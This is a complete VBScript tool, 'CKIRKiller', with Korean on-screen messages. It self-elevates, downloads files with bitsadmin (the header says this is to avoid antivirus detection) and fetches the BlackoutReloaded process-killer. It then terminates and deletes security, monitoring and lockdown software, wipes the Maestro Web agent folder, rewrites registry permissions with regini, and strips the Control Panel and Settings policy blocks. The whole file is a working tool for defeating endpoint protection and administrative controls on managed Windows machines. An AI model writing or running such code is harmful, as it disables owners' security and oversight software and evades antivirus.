' ============================================================
'  CKIRKiller - VBScript
'  Download via bitsadmin (no ADODB.Stream - avoids AV flag)
'  Double-click to run. No cmd or PowerShell required.
' ============================================================

Option Explicit

Dim oShell, oFSO, oWMI
Set oShell = CreateObject("WScript.Shell")
Set oFSO   = CreateObject("Scripting.FileSystemObject")
Set oWMI   = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")

Const GitPath     = "C:\Program Files\Git"
Const BlackoutExe = "C:\Program Files\Git\BlackoutReloaded.exe"
Const GitInstaller= "C:\Windows\Temp\Git-Installer.exe"
Const BlackoutTmp = "C:\Windows\Temp\BlackoutReloaded.exe"
Const MaestroDir  = "C:\Program Files (x86)\Solusseum\MaestroWeb Agent"
Const GitURL      = "https://github.com/git-for-windows/git/releases/download/v2.53.0.windows.2/Git-2.53.0.2-64-bit.exe"
Const BlackoutURL = "https://github.com/tijme/blackout-reloaded/raw/master/BlackoutReloaded.exe"

' ── Admin check ─────────────────────────────────────────────
Dim sTestFile : sTestFile = "C:\Windows\System32\_admintest_.tmp"
Dim bAdmin : bAdmin = False
On Error Resume Next
Dim oTest : Set oTest = oFSO.CreateTextFile(sTestFile, True)
If Err.Number = 0 Then
    bAdmin = True
    oTest.Close
    oFSO.DeleteFile sTestFile, True
End If
On Error GoTo 0

If Not bAdmin Then
    Dim sScript : sScript = WScript.ScriptFullName
    oShell.Run "mshta vbscript:Execute(""CreateObject(""""Shell.Application"""").ShellExecute """"wscript.exe"""","""""""""  & sScript & """"""""",,""""runas"""",1:close"")", 0, False
    WScript.Quit
End If

' ── Main ────────────────────────────────────────────────────
MsgBox "작업이 시작됩니다." & vbCrLf & _
       "자동적으로 각 작업이 진행되니 확인 버튼만 클릭하면 됩니다.", _
       vbInformation, "CKIRKiller"

' STEP 1: Install Git
If Not oFSO.FileExists(GitPath & "\git-bash.exe") Then
    MsgBox "1/3단계: Git 다운로드 중(시간이 다소 소요됩니다)...", vbInformation, "CKIRKiller"
    BitsDownload GitURL, GitInstaller
    oShell.Run """" & GitInstaller & """ /VERYSILENT /NORESTART /NOCANCEL /SP-", 0, True
End If

' STEP 2: Place BlackoutReloaded.exe
If Not oFSO.FileExists(BlackoutExe) Then
    MsgBox "2/3단계: BlackoutReloaded.exe 다운로드 중...", vbInformation, "CKIRKiller"
    BitsDownload BlackoutURL, BlackoutTmp
    On Error Resume Next
    oFSO.MoveFile BlackoutTmp, BlackoutExe
    On Error GoTo 0
End If

' STEP 3: Kill wave 1 & 2 targets
MsgBox "3/3단계: 보안 프로세스 종료 및 제거 중...", vbInformation, "CKIRKiller"
BlackoutWithPath "qukapttp.exe"
BlackoutWithPath "nfowjxyfd.exe"
BlackoutWithPath "lqndauccd.exe"
BlackoutWithPath "rwtyijsa.exe"
BlackoutWithPath "nhfneczzm.exe"
BlackoutWithPath "AYCWSSrv.ayc"
BlackoutWithPath "AYCRTSrv.ayc"
BlackoutWithPath "AYIASrv.exe"
BlackoutWithPath "AYCUpdSrv.ayc"
BlackoutWithPath "AYCMain.ayc"
BlackoutWithPath "AYCAgent.ayc"
BlackoutWithPath "AYCRTSrv.exe"
BlackoutWithPath "AYIASrv.exe"
BlackoutWithPath "Yoondisk_hd_recv.exe"
BlackoutWithPath "yoondisk_chplayer.exe"
BlackoutAndDelete "MaestroWebSvr.exe"
BlackoutAndDelete "MaestroWebAgent.exe"
BlackoutAndDelete "SoluLock.exe"
If oFSO.FolderExists(MaestroDir) Then
    DeleteFolderContents MaestroDir
End If

' --- STEP 4: Hancom IME Remove (PowerShell) ---
MsgBox "한컴 입력기 삭제를 시작합니다..", vbInformation, "CKIRKiller"

Dim psCmd
psCmd = "powershell.exe -ExecutionPolicy Bypass -Command """ & _
    "$list = New-WinUserLanguageList -Language 'ko-KR'; " & _
    "Set-WinUserLanguageList -LanguageList $list -Force; " & _
    "Stop-Process -Name ctfmon -Force -ErrorAction SilentlyContinue; " & _
    "Remove-Item -Path 'HKCU:\Software\Microsoft\CTF\SortOrder' -Recurse -Force -ErrorAction SilentlyContinue; " & _
    "Start-Process ctfmon.exe" & _
    """"

oShell.Run psCmd, 1, True  ' 0 → 1 로 변경

' --- STEP 5: Control Panel Unlock (REGINI SYSTEM Bypass) ---
MsgBox "제어판 해금을 시작합니다..", vbInformation, "CKIRKiller"

Dim tempDir : tempDir = oFSO.GetSpecialFolder(2)
Dim reginiPath : reginiPath = tempDir & "\unlock_cp.ini"
Dim oTextStream

' 1. REGINI 설정 파일 생성: 관리자(1)와 시스템(17)에게 Full Control 권한 부여
Set oTextStream = oFSO.CreateTextFile(reginiPath, True)
oTextStream.WriteLine "\Registry\Machine\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer [1 5 7 17]"
oTextStream.Close

' 2. regini.exe 실행하여 레지스트리 권한 강제 덮어쓰기
oShell.Run "regini.exe """ & reginiPath & """", 0, True
WScript.Sleep 500

' 3. 권한 획득 성공 후, HKLM과 HKCU 양쪽에서 제어판/설정 차단 값 삭제
On Error Resume Next
oShell.Run "cmd /c reg delete ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoControlPanel /f", 0, True
oShell.Run "cmd /c reg delete ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoSettingsPage /f", 0, True
oShell.Run "cmd /c reg delete ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoControlPanel /f", 0, True
On Error GoTo 0

' 4. 탐색기 재시작 (화면이 깜빡이면서 설정 적용)
oShell.Run "taskkill /F /IM explorer.exe", 0, True
WScript.Sleep 1500
oShell.Run "explorer.exe", 0, False

' 5. 임시 파일 정리
On Error Resume Next
oFSO.DeleteFile reginiPath, True
On Error GoTo 0

MsgBox "제어판 해금이 완료되었습니다!", vbInformation, "CKIRKiller"

WScript.Quit

' ============================================================
'  Helpers
' ============================================================

Sub BitsDownload(sURL, sDest)
    On Error Resume Next
    oFSO.DeleteFile sDest, True
    On Error GoTo 0
    oShell.Run "bitsadmin /transfer bloatdl /download /priority foreground """ & sURL & """ """ & sDest & """", 0, True
End Sub

Sub BlackoutWithPath(sExe)
    Dim sFilePath : sFilePath = ""
    Dim oProcs, oProc
    Set oProcs = oWMI.ExecQuery("SELECT ExecutablePath FROM Win32_Process WHERE Name='" & sExe & "'")
    For Each oProc In oProcs
        If oProc.ExecutablePath <> "" Then sFilePath = oProc.ExecutablePath
    Next

    oShell.Run "taskkill /F /IM """ & sExe & """", 0, True
    WScript.Sleep 300
    oShell.Run """" & BlackoutExe & """ " & sExe, 0, True

    If sFilePath <> "" Then
        On Error Resume Next
        oFSO.DeleteFile sFilePath, True
        On Error GoTo 0
    End If
End Sub

Sub BlackoutAndDelete(sExe)
    Dim sFilePath : sFilePath = MaestroDir & "\" & sExe
    Dim oProcs, oProc
    Set oProcs = oWMI.ExecQuery("SELECT ExecutablePath FROM Win32_Process WHERE Name='" & sExe & "'")
    For Each oProc In oProcs
        If oProc.ExecutablePath <> "" Then sFilePath = oProc.ExecutablePath
    Next

    oShell.Run "taskkill /F /IM """ & sExe & """", 0, False
    oShell.Run """" & BlackoutExe & """ " & sExe, 0, False

    WScript.Sleep 50
    On Error Resume Next
    oFSO.DeleteFile sFilePath, True
    On Error GoTo 0

    WScript.Sleep 200
    On Error Resume Next
    oFSO.DeleteFile sFilePath, True
    On Error GoTo 0
End Sub

Sub DeleteFolderContents(sPath)
    Dim oFolder : Set oFolder = oFSO.GetFolder(sPath)
    Dim oFile, oSub
    For Each oFile In oFolder.Files
        On Error Resume Next
        oFile.Delete True
        On Error GoTo 0
    Next
    For Each oSub In oFolder.SubFolders
        On Error Resume Next
        oSub.Delete True
        On Error GoTo 0
    Next
End Sub
